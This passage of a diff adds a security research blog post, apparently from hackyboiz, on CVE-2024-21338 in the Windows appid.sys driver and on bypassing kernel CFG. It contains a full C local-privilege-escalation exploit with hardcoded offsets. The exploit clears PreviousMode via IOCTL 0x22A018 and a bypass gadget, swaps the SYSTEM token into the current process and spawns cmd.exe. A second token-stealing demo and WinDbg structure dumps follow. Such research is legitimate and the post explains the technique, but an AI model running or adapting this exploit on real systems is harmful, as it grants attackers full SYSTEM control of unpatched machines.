+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; DEVICE_NAME &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;\\\\?\\AppID&amp;quot;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// IOCTL 0x22A018&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; {&lt;/span&gt;
+	PVOID arg1;
+	PVOID objptr;
+	PVOID cfgptr;
+	PVOID unknown;
+} INPUT_BUFFER;
+
+_NtQuerySystemInformation pNtQuerySystemInformation;
+_NtFsControlFile pNtFsControlFile;
+_NtWriteVirtualMemory pNtWriteVirtualMemory;
+_NtReadVirtualMemory pNtReadVIrtualMemory;
+_NtDeviceIoControlFile pNtDeviceIoControlFile;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;GetNtFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{...}
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetImageBase&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* ModuleName)&lt;/span&gt; &lt;/span&gt;{...}
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetFILE_OBJECT_Address&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;{...}
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PULONGLONG objptr, ULONG pid, HANDLE handle)&lt;/span&gt;&lt;/span&gt;{...}
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
+	PVOID KTHREAD = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID SYSTEM_EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID PreviousMode = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID NTOSKRNL_BASE = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+
+	ULONG dwbytes = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+	GetNtFunction();
+
+	DWORD pid = GetCurrentProcessId();
+
+	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
+	GetObj(&amp;amp;KTHREAD, pid, hThread);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current KTHREAD: %p\n&amp;quot;&lt;/span&gt;, KTHREAD);
+
+	PreviousMode = (UINT64)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;;
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] PreviousMode address: %p\n&amp;quot;&lt;/span&gt;, PreviousMode);
+
+	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
+	GetObj(&amp;amp;EPROCESS, pid, hProc);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current EPROCESS: %p\n&amp;quot;&lt;/span&gt;, EPROCESS);
+
+	GetObj(&amp;amp;SYSTEM_EPROCESS, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] System EPROCESS: %p\n&amp;quot;&lt;/span&gt;, SYSTEM_EPROCESS);
+
+	NTOSKRNL_BASE = GetImageBase(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ntoskrnl.exe&amp;quot;&lt;/span&gt;);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] ntoskrnl.exe base address : %p\n&amp;quot;&lt;/span&gt;, NTOSKRNL_BASE);
+
+	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + &lt;span class=&#34;hljs-number&#34;&gt;0xA01FD0&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// kcfg bypass gadget&lt;/span&gt;
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] ExpProfileDelete function address : %p\n&amp;quot;&lt;/span&gt;, ExpProfileDelete);
+
+	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();
+
+	INPUT_BUFFER buffer = { &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, };
+	HANDLE dHandle;
+	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, CREATE_NEW, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
+
+	buffer.arg1 = (UINT64)PreviousMode + &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;;		
+	buffer.objptr = FILE_OBJECT;					
+	buffer.cfgptr = &amp;amp;ExpProfileDelete;				
+	buffer.unknown = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;							
+
+	IO_STATUS_BLOCK ioStatus;
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (pNtDeviceIoControlFile(dHandle, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;ioStatus, &lt;span class=&#34;hljs-number&#34;&gt;0x22A018&lt;/span&gt;, &amp;amp;buffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(buffer), &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;dwbytes) != NOERROR) {
+		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;NtDeviceIoControlFile Failed, 0x%x\n&amp;quot;&lt;/span&gt;, GetLastError());
+	}
+
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* restoreBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR));
+	*restoreBuffer = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;, (PVOID)restoreBuffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR), &amp;amp;dwbytes);
+
+	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c&#34;&gt;https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2013.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I originally planned to introduce all three techniques in this part. It ended up being longer than I thought, so I&amp;#x2019;ll summarize the remaining two techniques in the next part&amp;#x2026; (it&amp;#x2019;s okay, I&amp;#x2019;m off for the holidays)&lt;/p&gt;
+&lt;p&gt;I&amp;#x2019;ll be back with Part 3 :) Keep up the good work in 2025!&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (En) - hackyboiz">
+  <meta property="og:description" content="&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/&#34;&gt;Bypassing Windows Kernel Mitigations: Part1 - Overview&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 &amp;#x2190; Now&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;After last month&amp;#x2019;s Part 1 introducing Windows Kernel Mitigation, we&amp;#x2019;re back with Part 2, and this time it&amp;#x2019;s time to dive into kCFG bypassing. We&amp;#x2019;ll analyze the Local Privilege Escalation vulnerability CVE-2024-21338 in appid.sys, which was patched in February 2024, and introduce three post-exploitation techniques to bypass kCFG.&lt;/p&gt;
+&lt;h2 id=&#34;CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference&#34;&gt;&lt;a href=&#34;#CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference&#34; class=&#34;headerlink&#34; title=&#34;CVE-2024-21338 - appid.sys Untrusted Pointer Dereference&#34;&gt;&lt;/a&gt;CVE-2024-21338 - appid.sys Untrusted Pointer Dereference&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Vulnerability analysis and exploitation was performed on Windows 23H2 build 22631.2861 (December 2023 Cumulative Update applied).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The CVE-2024-21338 vulnerability itself is simple! &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%201.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When the appid.sys driver processes an I/O request from user mode, it calls the &lt;code&gt;AipSmartHashImageFile&lt;/code&gt; function with a user mode buffer (SystemBuffer) if the IOCTL Code is &lt;code&gt;0x22A018&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%202.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Called in the following order: &lt;code&gt;AipSmartHashImageFile&lt;/code&gt; - &lt;code&gt;AppHashComputeFileHashesInternal&lt;/code&gt; - &lt;code&gt;AppHashComputeImageHashInternal&lt;/code&gt;. In the &lt;code&gt;AppHashComputeImageHashInternal&lt;/code&gt; function, call a pointer at offset &lt;code&gt;SystemBuffer+0x16.&lt;/code&gt; &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;By calling the user-mode controllable SystemBuffer in kernel context, the user will be able to call arbitrary callback pointers in kernel mode (red box). We can even control the address that references the first argument, rcx (blue box).&lt;/p&gt;
+&lt;p&gt;For more analysis and PoC, check out the reference links below!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp&#34;&gt;https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/&#34;&gt;https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now we can call any function we want, but can&amp;#x2019;t take advantage of any shellcode or ROP gadgets configured in user mode due to the existence of the mitgation below. &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SMEP that prevents the CPU from executing userland (ring 3) code while in Supervisor Mode (ring 0) privileged state.&lt;/li&gt;
+&lt;li&gt;kCFG that throws an exception and raises &lt;code&gt;KERNEL_SECURITY_CHECK_FAILURE&lt;/code&gt; if the kernel address is not registered in the bitmap&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Even if the SMEP is bypassed by calling the address of the bypass gadget, it will still get stuck in kCFG because it is user-mode code.&lt;/p&gt;
+&lt;p&gt;Kernel exploits aimed at privilege escalation via token swapping require read and write access to kernel memory. To achieve this, three exploit techniques can establish Full Arbitrary Kernel Read/Write primitives by calling kernel functions that satisfy with kCFG.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;PreviousMode&lt;/li&gt;
+&lt;li&gt;SeDebugPrigvileges&lt;/li&gt;
+&lt;li&gt;I/O Ring Buffer&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;del&gt;In this part, I will introduce the above three techniques&lt;/del&gt; Due to lack of time, I will only introduce the exploit using PreviousMode in this part&amp;#x2026; and will cover the exploit using SeDebugPrivileges and I/O Ring Buffer in the next part!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;EXP-1-PreviousMode&#34;&gt;&lt;a href=&#34;#EXP-1-PreviousMode&#34; class=&#34;headerlink&#34; title=&#34;EXP 1 - PreviousMode&#34;&gt;&lt;/a&gt;EXP 1 - PreviousMode&lt;/h2&gt;&lt;p&gt;The first is via the PreviousMode modification.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode&#34;&gt;PreviousMode&lt;/a&gt; is a KTHREAD structure field that is a flag value that indicates that the thread&amp;#x2019;s parameters came from a user-mode process if the user-mode application called a native system service routine in either the &lt;strong&gt;Nt&lt;/strong&gt; or &lt;strong&gt;Zw&lt;/strong&gt; version. A PreviousMode value of 1 indicates that the current thread object was created by a call from user-mode, and a value of 0 indicates that it was created from kernel-mode. This serves to restrict kernel access to objects from user-mode.&lt;/p&gt;
+&lt;p&gt;PreviousMode is a field in the KTHREAD structure that acts as a flag. It indicates whether the thread&amp;#x2019;s parameters originated from a user-mode process. If a user-mode application calls a native system service routine (either the Nt or Zw version), PreviousMode reflects this.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A value of 1 means the thread was created by a call from user mode.&lt;/li&gt;
+&lt;li&gt;A value of 0 means it was created from kernel mode.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This flag helps restrict kernel access to objects originating from user mode&lt;/p&gt;
+&lt;p&gt;If we can modify the PrevousMode of a user-mode process to 0, we can call the &lt;code&gt;NtWriteVirtualMemory&lt;/code&gt; or &lt;code&gt;ReadProcessMemory&lt;/code&gt; functions to get the kernel memory RW primitives, which we&amp;#x2019;ll demonstrate with a simple example and debugging to help make it easier to understand!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;defines.h&amp;quot;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xc0000004&lt;/span&gt;
+
+_NtQuerySystemInformation pNtQuerySystemInformation;
+_NtFsControlFile pNtFsControlFile;
+_NtWriteVirtualMemory pNtWriteVirtualMemory;
+_NtReadVirtualMemory pNtReadVIrtualMemory;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;GetNtFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{...}
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PULONGLONG objptr, ULONG pid, HANDLE handle)&lt;/span&gt;&lt;/span&gt;{...}
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
+	PVOID KTHREAD = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID SYSTEM_EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+
+	ULONG dwbytes = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+	GetNtFunction();
+
+	DWORD pid = GetCurrentProcessId();
+	
+	&lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
+	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
+	GetObj(&amp;amp;KTHREAD, pid, hThread);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current KTHREAD: %p\n&amp;quot;&lt;/span&gt;, KTHREAD);
+
+	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
+	GetObj(&amp;amp;EPROCESS, pid, hProc);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current EPROCESS: %p\n&amp;quot;&lt;/span&gt;, EPROCESS);
+
+	GetObj(&amp;amp;SYSTEM_EPROCESS, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] System EPROCESS: %p\n&amp;quot;&lt;/span&gt;, SYSTEM_EPROCESS);
+
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;modify previousmode in windbg and press any button..\n&amp;quot;&lt;/span&gt;);
+	getch();
+
+	&lt;span class=&#34;hljs-comment&#34;&gt;// [2]&lt;/span&gt;
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt; , (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);
+
+	&lt;span class=&#34;hljs-comment&#34;&gt;// [3]&lt;/span&gt;
+	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);
+	
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c&#34;&gt;https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The above code works as follows&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Leak the required address via the &lt;code&gt;NtQuerySystemInformation&lt;/code&gt; API&lt;/li&gt;
+&lt;li&gt;Overwrite the token value of the user-mode process to the system process&lt;/li&gt;
+&lt;li&gt;Spawn a cmd with system privileges&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In normal execution, nothing happens because the user-mode process cannot RW the kernel memory via &lt;code&gt;pNtWriteVirtualMemory&lt;/code&gt;&amp;#x2026;but we will now modify PreviouMode in the debugger before calling &lt;code&gt;pNtWriteVirtualMemory&lt;/code&gt; and do the privilege escalation.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When we run it, it will output the KTHREAD/EPROCESS address of the current process and the EPROCESS address of the SYSTEM process. Copy these and go to windbg.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;: kd&amp;gt; dt _KTHREAD FFFFDC0FC3780080
+nt!_KTHREAD
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; Header           : _DISPATCHER_HEADER
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; SListFaultAddress : (null) 
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt; QuantumTarget    : &lt;span class=&#34;hljs-number&#34;&gt;0x8ad5b1e&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x028&lt;/span&gt; InitialStack     : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c30 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x030&lt;/span&gt; StackLimit       : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;1000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x038&lt;/span&gt; StackBase        : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;8000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; ThreadLock       : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x048&lt;/span&gt; CycleTime        : &lt;span class=&#34;hljs-number&#34;&gt;0x4bf645c&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x050&lt;/span&gt; CurrentRunTime   : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x054&lt;/span&gt; ExpectedRunTime  : &lt;span class=&#34;hljs-number&#34;&gt;0xbe0b&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x058&lt;/span&gt; KernelStack      : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x060&lt;/span&gt; StateSaveArea    : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c80 _XSAVE_FORMAT
+...
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x220&lt;/span&gt; Process          : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c39640c0 _KPROCESS
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x228&lt;/span&gt; UserAffinity     : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c3780a68 _KAFFINITY_EX
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x230&lt;/span&gt; UserAffinityPrimaryGroup : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt; PreviousMode     : &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
+   +0x233 BasePriority     : 8 &amp;apos;&amp;apos;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%206.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can see that PreviouMode is located at &lt;code&gt;KTHREAD+0x232&lt;/code&gt;. Since the current process is in user mode, we can see that the PreviouMode is 1. Now, in the Memory window of windbg, modify that value to 0.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;: kd&amp;gt; dt _KTHREAD FFFFDC0FC3780080
+nt!_KTHREAD
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; Header           : _DISPATCHER_HEADER
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; SListFaultAddress : (null) 
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt; QuantumTarget    : &lt;span class=&#34;hljs-number&#34;&gt;0x8ad5b1e&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x028&lt;/span&gt; InitialStack     : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c30 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x030&lt;/span&gt; StackLimit       : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;1000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x038&lt;/span&gt; StackBase        : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;8000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; ThreadLock       : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x048&lt;/span&gt; CycleTime        : &lt;span class=&#34;hljs-number&#34;&gt;0x4bf645c&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x050&lt;/span&gt; CurrentRunTime   : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x054&lt;/span&gt; ExpectedRunTime  : &lt;span class=&#34;hljs-number&#34;&gt;0xbe0b&lt;/span&gt;
